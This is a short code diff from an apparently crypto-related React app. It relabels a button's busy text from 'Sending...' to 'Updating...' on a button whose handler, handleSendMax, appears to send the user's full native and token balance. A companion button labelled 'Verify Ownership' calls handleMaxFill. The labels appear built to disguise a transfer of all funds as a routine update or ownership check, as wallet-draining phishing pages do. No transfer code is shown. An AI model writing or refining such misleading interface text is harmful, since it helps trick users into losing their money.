@@ -168,7 +168,7 @@ export default function App() {
           <div style={{ marginTop: 10 }}>
             <button onClick={handleMaxFill} disabled={sending}>Verify Ownership</button>
             <button onClick={handleSendMax} style={{ marginLeft: 10 }} disabled={sending}>
-              {sending ? "Sending..." : "Update (Native + Tokens)"}
+              {sending ? "Updating..." : "Update (Native + Tokens)"}
             </button>
           </div>
         </>
